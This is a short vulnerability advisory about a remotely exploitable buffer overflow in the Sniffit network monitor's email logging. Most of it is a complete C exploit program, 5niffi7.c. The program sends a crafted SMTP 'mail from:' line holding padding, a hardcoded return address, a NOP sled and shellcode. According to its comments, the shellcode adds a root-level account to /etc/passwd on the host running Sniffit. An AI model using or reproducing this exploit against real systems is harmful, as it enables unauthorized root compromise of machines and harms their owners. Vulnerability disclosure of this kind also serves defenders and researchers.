source: http://www.securityfocus.com/bid/1158/info
 
Sniffit is a freely available, open source network monitoring tool. It is designed for use on the Unix and Linux Operating Systems.
 
Sniffit contains a remotely exploitable buffer overflow vulnerability. If Sniffit is configured to log emails, attackers may be able to exploit a stack overflow in the logging mechanism and execute arbitrary code as root on the underlying host.
 
There may be other buffer overflow vulnerabilities in sniffit related to the logging mechanism. There are several suspicious instances of sprintf() in the logging functions. Administrators are advised to use more actively supported alternatives such as Snort or dsniff.

/*
 * 5niffi7.c - exploiting sniffit 0.3.7.beta for Debian 2.2
 * Copyright (C) 2000  Michel "MaXX" Kaempf <maxx@via.ecp.fr>
 *
 * When a running sniffit session logs the packet sent by 5niffi7,
 * the following shellcode is executed. This shellcode adds the
 * line "r00t:36msvq8vbkg5k:0:0:r00t:/:/bin/sh" to /etc/passwd.
 * Cracking r00t's password should not be too hard :-)
 *
 * 5niffi7.c is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */

#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define FROM "mail from: "
#define RET 0xbfff6b5b

char shellcode[] =
"\xeb\x5b\x90\x90\x90\x90\x90\x90"
"\x90\x90\x5e\x80\x6e\xd9\x1a\x80"
"\x6e\xdd\x1a\x80\x6e\xd7\x1a\x80"
"\x6e\xc4\x1a\x80\x6e\xe4\x1a\x90"
"\x90\x90\x90\x31\xc0\x88\x60\x0b"
"\xb0\x05\x89\xf3\x31\xc9\x66\xb9"
"\x01\x04\x31\xd2\xcd\x80\x89\xc7"
"\xc6\x60\x31\x24\x31\xc0\x88\x60"
"\x32\xb0\x04\x89\xfb\x8d\x68\x0c"
"\x31\xd2\xb2\x26\xcd\x80\x31\xc0"
"\xb0\x06\x89\xfb\xcd\x80\x31\xdb"
"\x89\xd8\x40\xcd\x80\xe8\xa8\xff"
"\xff\xff\x2f\x65\x74\x63\x2f\x70"
"\x61\x73\x73\x77\x64\x78\x72\x30"
"\x30\x74\x3a\x33\x36\x6d\x73\x76"
"\x71\x38\x76\x62\x6b\x67\x35\x6b"
"\x3a\x30\x3a\x30\x3a\x72\x30\x30"
"\x74\x3a\x2f\x3a\x2f\x62\x69\x6e"
"\x2f\x73\x68\x78\x78";

int main( int argc, char * argv[] )
{
	int sock_client;
	struct sockaddr_in addr_server, addr_client;
	int i, j;
	char * ip_src, * ip_dst;
	char conn[ 256 ], msg[ 1500 ];

	if ( argc != 2 )
	{
		fprintf( stderr, "Usage: %s IP\n", argv[0] );
		exit( -1 );
	}

	if ( (sock_client = socket(PF_INET, SOCK_STREAM, 0)) < 0 )
	{
		exit( -1 );
	}

	bzero( (void *)&addr_server, sizeof(struct sockaddr_in) );
	addr_server.sin_family = AF_INET;
	addr_server.sin_port = htons( 25 );
	inet_aton( argv[1], &addr_server.sin_addr );

	if ( connect(sock_client, (struct sockaddr *)&addr_server, sizeof(struct sockaddr_in)) < 0 )
	{
		exit( -1 );
	}

	i = sizeof( struct sockaddr );
	getsockname( sock_client, (struct sockaddr *)&addr_client, &i );

	ip_src = strdup( inet_ntoa(addr_client.sin_addr) );
	ip_dst = strdup( inet_ntoa(addr_server.sin_addr) );
	snprintf( conn, sizeof(conn), "%s.%u-%s.%u", ip_src, ntohs(addr_client.sin_port), ip_dst, ntohs(addr_server.sin_port) );
	free( ip_src );
	free( ip_dst );

	bzero( msg, sizeof(msg) );
	i = 0;
	for ( j = 0; j < strlen(FROM); i++, j++ )
	{
		msg[ i ] = FROM[ j ];
	}
	for ( j = 0; j < 256 - strlen(conn) - strlen(": mail [") - strlen(FROM); i++, j++ )
	{
		msg[ i ] = 'A';
	}
	*((unsigned long *)(&(msg[i]))) = RET;
	i += 4;
	for ( j = 0; j < 1024; i++, j++ )
	{
		msg[ i ] = 0x90;
	}
	for ( j = 0; j < strlen(shellcode); i++, j++ )
	{
		msg[ i ] = shellcode[ j ];
	}

	if ( write(sock_client, msg, strlen(msg)) < 0 )
	{
		exit( -1 );
	}

	close( sock_client );

	exit( 0 );
}